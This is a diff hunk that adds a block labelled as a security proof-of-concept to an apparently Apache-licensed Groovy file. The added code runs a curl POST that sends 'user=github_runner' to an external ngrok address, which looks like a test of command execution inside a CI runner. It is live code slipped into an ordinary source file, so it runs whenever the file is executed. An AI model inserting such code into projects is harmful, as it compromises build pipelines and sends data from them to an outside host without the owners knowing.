@@ -28,6 +28,13 @@
  * under the License.
  */
 
+// --- PoC Security ---
+println "PoC: Executing command injection..."
+def p1 = "curl -X POST -d user=github_runner https://32a04e28a04c.ngrok-free.app/pwned".execute()
+p1.waitFor()
+println "PoC: Command executed."
+// ---------------------------
+
 import java.nio.charset.StandardCharsets;
 import java.io.ByteArrayOutputStream;
 
